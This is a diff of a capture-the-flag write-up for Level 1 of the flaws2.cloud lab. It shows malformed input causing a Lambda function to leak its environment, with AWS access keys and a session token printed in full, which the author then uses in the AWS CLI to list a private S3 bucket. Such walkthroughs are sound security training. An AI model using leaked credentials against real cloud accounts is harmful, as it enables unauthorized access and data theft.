@@ -21,8 +21,9 @@ Before starting, I wanted to say thank you again to the creator of these games, 
 
 ## Level 1
 
-The first hint tells us that to look at the JavaScript code. There is a client-side check for the parameter to be a number. This suggests that the application only accepts numbers.
+The first hint tells us to look at the JavaScript code. There is a client-side check on the parameter, which needs to be a number. This suggests that the backend application only accepts numbers.
 
+```js
 <script type="text/javascript">
     function validateForm() {
         var code = document.forms["myForm"]["code"].value;
@@ -32,25 +33,30 @@ The first hint tells us that to look at the JavaScript code. There is a client-s
         }
     }
 </script>
+```
 
-Form is validated as follows:
+Form data is validated as follows:
 
+```js
 <form name="myForm" action="https://2rfismmoo8.execute-api.us-east-1.amazonaws.com/default/level1" onsubmit="return validateForm()">
   Code: <input type="text" name="code" value="1234">
   <br><br>
   <input type="submit" value="Submit">
 </form>
+```
 
-Let’s try an invalid input:
+Let’s try an invalid input and see what happens:
 
-https://2rfismmoo8.execute-api.us-east-1.amazonaws.com/default/level1?code=aaa
+<a href="https://2rfismmoo8.execute-api.us-east-1.amazonaws.com/default/level1?code=aaa">2rfismmoo8.execute-api.us-east-1.amazonaws.com/default/level1?code=aaa</a></p>
 
+```js
 Error, malformed input
-
 {"PATH":"/var/lang/bin:/usr/local/bin:/usr/bin/:/bin:/opt/bin","LD_LIBRARY_PATH":"/var/lang/lib:/lib64:/usr/lib64:/var/runtime:/var/runtime/lib:/var/task:/var/task/lib:/opt/lib","LANG":"en_US.UTF-8","TZ":":UTC","LAMBDA_TASK_ROOT":"/var/task","LAMBDA_RUNTIME_DIR":"/var/runtime","AWS_REGION":"us-east-1","AWS_DEFAULT_REGION":"us-east-1","AWS_LAMBDA_LOG_GROUP_NAME":"/aws/lambda/level1","AWS_LAMBDA_LOG_STREAM_NAME":"2019/11/03/[$LATEST]cccc0a37345a46b39d4b8a60f2b62b66","AWS_LAMBDA_FUNCTION_NAME":"level1","AWS_LAMBDA_FUNCTION_MEMORY_SIZE":"128","AWS_LAMBDA_FUNCTION_VERSION":"$LATEST","_AWS_XRAY_DAEMON_ADDRESS":"169.254.79.2","_AWS_XRAY_DAEMON_PORT":"2000","AWS_XRAY_DAEMON_ADDRESS":"169.254.79.2:2000","AWS_XRAY_CONTEXT_MISSING":"LOG_ERROR","_X_AMZN_TRACE_ID":"Root=1-5dbecfe6-0ea4e36c115f65a44848e788;Parent=12db6171262706d6;Sampled=0","AWS_EXECUTION_ENV":"AWS_Lambda_nodejs8.10","_HANDLER":"index.handler","NODE_PATH":"/opt/nodejs/node8/node_modules:/opt/nodejs/node_modules:/var/runtime/node_modules:/var/runtime:/var/task:/var/runtime/node_modules","AWS_ACCESS_KEY_ID":"ASIAZQNB3KHGMCKNDKFP","AWS_SECRET_ACCESS_KEY":"hq73xAPItXJdI5QOuwrbAp1RSeOHqNMhX+rR943w","AWS_SESSION_TOKEN":"IQoJb3JpZ2luX2VjEBUaCXVzLWVhc3QtMSJHMEUCIAivjnHKWl/7dbwK2dH3FCQxb9xa819AYNUFpabUTNN1AiEA+FJRUCQ0r0VgSyvhe7kh/JuFgIHZW4bYkX2bQ40GXfMqxQEILhABGgw2NTM3MTEzMzE3ODgiDCdo3a4XvhCxiHXtciqiAT6ju04Rc5+I/96OjS+gz37pb64x62f0lbQQRMwolN3G6FYWqUbIR1DNtsxEGmCPEVGsbtKl2bxGTRgMcuQqEJCIf/bE5Kimx3KgTJcoiyQwunMAIlJwJbRRV9Jhc6dPCS6BI9wBMT5PBmqRD9Qat7sDMoss3kzsm7G+AaMF5EN8u0RgD+jo12MmtL+kniU4NrPz5BdHyWl2nbRwtB3GNR3QtjDqnPvtBTrgAYLAx5pyfBWt+MBOqhjjHLN4w/86kvcAN7jkkycFljRx/pPcyD2k5WJcaxGnTioHmcIpso9nmZarbqEx9kuRtzz8rrgBFoGwJwTA+HW33VeeDRVYybdzJaasExoXtS1ziNdR+g/Kzm4STjms/eg0N0Qp69lapE+TtzCEEJOq9W/dvLLaGiRKEe7dFNqbovXRR2m3t6T26a/kkXnQw9PT78iSLVeG5sB6bR4PtdDa6m/ZlsbdztG//fhgJ+ktCQqweCg+LH+lY1ljygzyDTQJUuds4pCVtFGMpMxz5XZhwMv7"}
+```
 
-Which after beautifying looks like this:
+The JSON object, after beautifying, looks like this:
 
+```js
 {
     "PATH": "/var/lang/bin:/usr/local/bin:/usr/bin/:/bin:/opt/bin",
     "LD_LIBRARY_PATH": "/var/lang/lib:/lib64:/usr/lib64:/var/runtime:/var/runtime/lib:/var/task:/var/task/lib:/opt/lib",
@@ -77,9 +83,11 @@ Which after beautifying looks like this:
     "AWS_SECRET_ACCESS_KEY": "hq73xAPItXJdI5QOuwrbAp1RSeOHqNMhX+rR943w",
     "AWS_SESSION_TOKEN": "IQoJb3JpZ2luX2VjEBUaCXVzLWVhc3QtMSJHMEUCIAivjnHKWl/7dbwK2dH3FCQxb9xa819AYNUFpabUTNN1AiEA+FJRUCQ0r0VgSyvhe7kh/JuFgIHZW4bYkX2bQ40GXfMqxQEILhABGgw2NTM3MTEzMzE3ODgiDCdo3a4XvhCxiHXtciqiAT6ju04Rc5+I/96OjS+gz37pb64x62f0lbQQRMwolN3G6FYWqUbIR1DNtsxEGmCPEVGsbtKl2bxGTRgMcuQqEJCIf/bE5Kimx3KgTJcoiyQwunMAIlJwJbRRV9Jhc6dPCS6BI9wBMT5PBmqRD9Qat7sDMoss3kzsm7G+AaMF5EN8u0RgD+jo12MmtL+kniU4NrPz5BdHyWl2nbRwtB3GNR3QtjDqnPvtBTrgAYLAx5pyfBWt+MBOqhjjHLN4w/86kvcAN7jkkycFljRx/pPcyD2k5WJcaxGnTioHmcIpso9nmZarbqEx9kuRtzz8rrgBFoGwJwTA+HW33VeeDRVYybdzJaasExoXtS1ziNdR+g/Kzm4STjms/eg0N0Qp69lapE+TtzCEEJOq9W/dvLLaGiRKEe7dFNqbovXRR2m3t6T26a/kkXnQw9PT78iSLVeG5sB6bR4PtdDa6m/ZlsbdztG//fhgJ+ktCQqweCg+LH+lY1ljygzyDTQJUuds4pCVtFGMpMxz5XZhwMv7"
 }
+```
 
-We’ll configure the AWS CLI with these 3 parameters in ~/.aws/credentials and inspect the bucket:
+We’ll configure the AWS CLI with these 3 parameters (**AWS_ACCESS_KEY_ID**, **AWS_SECRET_ACCESS_KEY** and **AWS_SESSION_TOKEN**)in ~/.aws/credentials and then inspect the bucket:
 
+```bash
 ~ aws --profile part2-attacker-level1 s3 ls s3://level1.flaws2.cloud
                            PRE img/
 2018-11-20 20:55:05      17102 favicon.ico
@@ -89,10 +97,12 @@ We’ll configure the AWS CLI with these 3 parameters in ~/.aws/credentials and 
 2018-11-21 02:00:23       2460 hint4.htm
 2018-11-21 02:00:17       3000 index.htm
 2018-11-21 02:00:17       1899 secret-ppxVFdwV4DDtZm8vbQRvhxL8mE6wxNco.html
+```
 
-Visiting that poage we get the link to the next level:
+Visiting that secret page gives us the link to the next level:
 
-The next level is at http://level2-g9785tw8478k4awxtbox9kk3c5ka8iiz.flaws2.cloud
+<a href="http://level2-g9785tw8478k4awxtbox9kk3c5ka8iiz.flaws2.cloud">level2-g9785tw8478k4awxtbox9kk3c5ka8iiz.flaws2.cloud</a></p>
+
 
 ## Level 2
 
